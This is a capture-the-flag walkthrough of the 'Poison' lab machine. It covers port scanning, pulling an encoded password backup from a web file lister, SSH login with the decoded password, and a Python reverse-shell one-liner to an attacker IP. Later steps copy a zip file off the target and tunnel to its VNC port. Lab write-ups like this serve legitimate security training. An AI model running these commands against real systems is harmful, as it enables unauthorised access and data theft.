# Poison

Nmap reports that 22,80 ports are open so we run a deeper scan to have a look on it

```bash
sudo nmap --open --min-rate 5000 -Pn 10.10.10.84 -oN ports

sudo nmap -sVC 10.10.10.84 -oN portsScan
```

The server is running a web app so we look trough it and we find a form with a GET method, so we will look further on this to vulnerate the website, seems to be a file finder so we will try to find sensitive info.


On `Sites to be tested: ini.php, info.php, listfiles.php, phpinfo.php` we go trough every file and we find that on `listfiles.php` there s a file called *pwdbackup.txt* so we browse to it and the file exist its a encrypted file and probably a password.

```bash
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d...
```

So we decode this badboi 13 times after a long 

*I can do this all day* - Captain America

We get `Charix!2#4%6&8(0` which indicates it can be a password for anything, since ssh is open we will just try it there.

```bash
ssh charix@10.10.10.84

# Seems that the password was Charix!2#4%6&8(0
```

We got the shell but it has some limitations, since netcat doesn't work we run

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.55",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

We copy the secret.zip to our machine so we can inspect the file and do `zip2john` if needed

```bash
scp charix@10.10.10.84:/home/charix/secret.zip ./                 

# Trying to unzip it but it did'nt work
unzip -P 'Charix!2#4%6&8(0' secret.zip

# We found ��[|Ֆz! no sense so we keep going

```

```bash

# We take a look at the local ports with sockstat
sockstat -4l

# So we redirect the server our own machine
# Charix!2#4%6&8(0

ssh -L 5901:localhost:5901 -N -f charix@10.10.10.84

vncviewer localhost:5901 -passwd secret

```

